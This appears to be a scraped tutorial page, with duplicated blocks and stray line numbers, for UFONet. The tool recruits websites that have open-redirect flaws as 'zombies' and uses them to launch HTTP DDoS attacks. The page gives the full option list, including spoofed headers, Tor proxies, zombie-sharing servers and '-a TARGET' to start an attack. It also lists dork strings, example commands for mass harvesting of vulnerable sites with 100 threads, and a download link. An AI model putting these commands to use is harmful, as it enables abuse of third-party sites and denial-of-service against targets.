@@ -1,0 +1,254 @@
+The tool abuses OSI Layer 7-HTTP to create/manage ‘zombies’ and to conduct different attacks using; GET/POST, multi-threading, proxies, origin spoofing methods, cache evasion techniques, etc.
+
+Definition of an “Open Redirect”:
+
+An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance.
+
+From: CWE-601: URL Redirection to Untrusted Site (‘Open Redirect’)
+
+Usage
+
+Options:
+  --version             show program's version number and exit
+  -h, --help            show this help message and exit
+  -v, --verbose         active verbose on requests
+  --update              check for latest stable version
+  --check-tor           check to see if Tor is used properly
+  --force-yes           set 'YES' to all questions
+  --disableisup         disable external check of target's status
+  --gui                 run GUI (UFONet Web Interface)
+
+  *Configure Request(s)*:
+    --proxy=PROXY       Use proxy server (tor: 'http://127.0.0.1:8118')
+    --user-agent=AGENT  Use another HTTP User-Agent header (default SPOOFED)
+    --referer=REFERER   Use another HTTP Referer header (default SPOOFED)
+    --host=HOST         Use another HTTP Host header (default NONE)
+    --xforw             Set your HTTP X-Forwarded-For with random IP values
+    --xclient           Set your HTTP X-Client-IP with random IP values
+    --timeout=TIMEOUT   Select your timeout (default 10)
+    --retries=RETRIES   Retries when the connection timeouts (default 1)
+    --threads=THREADS   Maximum number of concurrent HTTP requests (default 5)
+    --delay=DELAY       Delay in seconds between each HTTP request (default 0)
+
+  *Search for 'Zombies'*:
+    -s SEARCH           Search from a 'dork' (ex: -s 'proxy.php?url=')
+    --sd=DORKS          Search from a list of 'dorks' (ex: --sd 'dorks.txt')
+    --sn=NUM_RESULTS    Set max number of results for engine (default 10)
+    --se=ENGINE         Search engine to use for 'dorking' (default: duck)
+    --sa                Search massively using all search engines
+
+  *Test Botnet*:
+    -t TEST             Update 'zombies' status (ex: -t 'zombies.txt')
+    --attack-me         Order 'zombies' to attack you (NAT required!)
+
+  *Community*:
+    --download-zombies  Download 'zombies' from Community server: Turina
+    --upload-zombies    Upload your 'zombies' to Community server: Turina
+    --blackhole         Create a 'blackhole' to share your 'zombies'
+    --up-to=UPIP        Upload your 'zombies' to a 'blackhole'
+    --down-from=DIP     Download your 'zombies' from a 'blackhole'
+
+  *Research Target*:
+    -i INSPECT          Search for biggest file (ex: -i 'http://target.com')
+
+  *Configure Attack(s)*:
+    --disable-aliens    Disable 'aliens' web abuse of test services
+    --disable-isup      Disable check status 'is target up?'
+    -r ROUNDS           Set number of rounds (default: 1)
+    -b PLACE            Set place to attack (ex: -b '/path/big.jpg')
+    -a TARGET           Start Web DDoS attack (ex: -a 'http(s)://target.com')
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+Options:
+  --version             show program's version number and exit
+  -h, --help            show this help message and exit
+  -v, --verbose         active verbose on requests
+  --update              check for latest stable version
+  --check-tor           check to see if Tor is used properly
+  --force-yes           set 'YES' to all questions
+  --disableisup         disable external check of target's status
+  --gui                 run GUI (UFONet Web Interface)
+ 
+  *Configure Request(s)*:
+    --proxy=PROXY       Use proxy server (tor: 'http://127.0.0.1:8118')
+    --user-agent=AGENT  Use another HTTP User-Agent header (default SPOOFED)
+    --referer=REFERER   Use another HTTP Referer header (default SPOOFED)
+    --host=HOST         Use another HTTP Host header (default NONE)
+    --xforw             Set your HTTP X-Forwarded-For with random IP values
+    --xclient           Set your HTTP X-Client-IP with random IP values
+    --timeout=TIMEOUT   Select your timeout (default 10)
+    --retries=RETRIES   Retries when the connection timeouts (default 1)
+    --threads=THREADS   Maximum number of concurrent HTTP requests (default 5)
+    --delay=DELAY       Delay in seconds between each HTTP request (default 0)
+ 
+  *Search for 'Zombies'*:
+    -s SEARCH           Search from a 'dork' (ex: -s 'proxy.php?url=')
+    --sd=DORKS          Search from a list of 'dorks' (ex: --sd 'dorks.txt')
+    --sn=NUM_RESULTS    Set max number of results for engine (default 10)
+    --se=ENGINE         Search engine to use for 'dorking' (default: duck)
+    --sa                Search massively using all search engines
+ 
+  *Test Botnet*:
+    -t TEST             Update 'zombies' status (ex: -t 'zombies.txt')
+    --attack-me         Order 'zombies' to attack you (NAT required!)
+ 
+  *Community*:
+    --download-zombies  Download 'zombies' from Community server: Turina
+    --upload-zombies    Upload your 'zombies' to Community server: Turina
+    --blackhole         Create a 'blackhole' to share your 'zombies'
+    --up-to=UPIP        Upload your 'zombies' to a 'blackhole'
+    --down-from=DIP     Download your 'zombies' from a 'blackhole'
+ 
+  *Research Target*:
+    -i INSPECT          Search for biggest file (ex: -i 'http://target.com')
+ 
+  *Configure Attack(s)*:
+    --disable-aliens    Disable 'aliens' web abuse of test services
+    --disable-isup      Disable check status 'is target up?'
+    -r ROUNDS           Set number of rounds (default: 1)
+    -b PLACE            Set place to attack (ex: -b '/path/big.jpg')
+    -a TARGET           Start Web DDoS attack (ex: -a 'http(s)://target.com')
+Searching for ‘Zombies’
+UFONet can dig on different search engines results to find possible ‘Open Redirect’ vulnerable sites. A common query string should be like this:
+
+
+ 
+
+
+        'proxy.php?url='
+        'check.cgi?url='
+        'checklink?uri='
+        'validator?uri='
+1
+2
+3
+4
+        'proxy.php?url='
+        'check.cgi?url='
+        'checklink?uri='
+        'validator?uri='
+For example you can begin a search with:
+
+
+       ./ufonet -s 'proxy.php?url='
+1
+       ./ufonet -s 'proxy.php?url='
+Or providing a list of “dorks” from a file:
+
+
+       ./ufonet --sd 'dorks.txt'
+1
+       ./ufonet --sd 'dorks.txt'
+By default UFONet will uses a search engine called ‘duck’. But you can choose a different one:
+
+
+       ./ufonet -s 'proxy.php?url=' --se 'bing'
+1
+       ./ufonet -s 'proxy.php?url=' --se 'bing'
+This is the list of available search engines with last time that were working:
+
+
+        - duck [07/10/2015: OK!]
+        - google [07/10/2015: OK!]
+        - bing [07/10/2015: OK!]
+        - yahoo [07/10/2015: OK!]
+        - yandex [07/10/2015: OK!]
+1
+2
+3
+4
+5
+        - duck [07/10/2015: OK!]
+        - google [07/10/2015: OK!]
+        - bing [07/10/2015: OK!]
+        - yahoo [07/10/2015: OK!]
+        - yandex [07/10/2015: OK!]
+You can also search massively using all search engines supported:
+
+
+       ./ufonet -s 'proxy.php?url=' --sa 
+1
+       ./ufonet -s 'proxy.php?url=' --sa 
+To control how many ‘zombies’ recieve from search engines you can use:
+
+
+       ./ufonet --sd 'dorks.txt' --sa --sn 20
+1
+       ./ufonet --sd 'dorks.txt' --sa --sn 20
+At the end of the process, you will be asked if you want to check the list retrieved to see if the urls are vulnerable.
+
+
+       Wanna check if they are valid zombies? (Y/n)
+1
+       Wanna check if they are valid zombies? (Y/n)
+Also, you will be asked to update the list adding automatically only ‘vulnerable’ web apps.
+
+
+       Wanna update your list (Y/n)
+1
+       Wanna update your list (Y/n)
+If you reply ‘Y’ your new ‘zombies’ will be appended to the file named: zombies.txt
+
+Examples:
+
+
+     + with verbose:     ./ufonet -s 'proxy.php?url=' -v
+     + with threads:     ./ufonet --sd 'dorks.txt' --sa --threads 100
+1
+2
+     + with verbose:     ./ufonet -s 'proxy.php?url=' -v
+     + with threads:     ./ufonet --sd 'dorks.txt' --sa --threads 100
+You can download UFOnet here:
+
+
+git clone https://github.com/epsylon/ufonet
+1
+git clone https://github.com/epsylon/ufonet
+Or read more here.
